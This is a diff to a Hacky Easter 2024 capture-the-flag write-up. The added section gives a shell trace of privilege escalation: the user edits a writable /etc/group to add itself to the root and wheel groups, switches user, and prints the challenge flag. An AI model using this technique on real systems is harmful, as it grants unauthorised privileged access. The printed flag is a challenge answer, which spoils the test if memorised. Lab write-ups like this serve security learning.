@@ -193,7 +193,63 @@ Some approaches from https://book.hacktricks.xyz/linux-hardening/privilege-escal
 
     touch /var/lock/subsys/local
 
+## How to get the flag: Wheel group in /etc/group
+The su permission seems to be missing because of the missing wheel group assignment. This can be corrected directly in /etc/group. Here the complete command line trace:
 
+    [minion@9706f0d02e1d ~]$ vi /etc/group
+    [minion@9706f0d02e1d ~]$ cat /etc/group
+    root:x:0:minion
+    bin:x:1:
+    daemon:x:2:
+    sys:x:3:
+    adm:x:4:
+    tty:x:5:
+    disk:x:6:
+    lp:x:7:
+    mem:x:8:
+    kmem:x:9:
+    wheel:x:10:minion
+    cdrom:x:11:
+    mail:x:12:
+    man:x:15:
+    dialout:x:18:
+    floppy:x:19:
+    games:x:20:
+    tape:x:33:
+    video:x:39:
+    ftp:x:50:
+    lock:x:54:
+    audio:x:63:
+    users:x:100:
+    nobody:x:65534:
+    utmp:x:22:
+    utempter:x:35:
+    input:x:999:
+    kvm:x:36:
+    render:x:998:
+    systemd-journal:x:190:
+    systemd-coredump:x:997:
+    dbus:x:81:
+    tss:x:59:
+    sgx:x:996:
+    systemd-oom:x:995:
+    ssh_keys:x:994:
+    sshd:x:74:
+    minion:x:1000:
+
+    [minion@9706f0d02e1d ~]$ su -l boss
+    Password: 
+    [boss@9706f0d02e1d ~]$ ls
+    lockdown.sh
+    [boss@9706f0d02e1d ~]$ ./lockdown.sh 
+    ZONE LOCKDOWN initiated!
+
+    Flag:  he2024{z0ne_l0ckd0wn_succ3ssfully_tr1gg3r3d}\n
+    ZONE LOCKDOWN completed, good bye.
+    Connection to ch.hackyeaster.com closed by remote host.
+    Connection to ch.hackyeaster.com closed.
+
+Credits for assistance: AstroViking
 
 ## The flag
-    he2024{}
+    he2024{z0ne_l0ckd0wn_succ3ssfully_tr1gg3r3d}
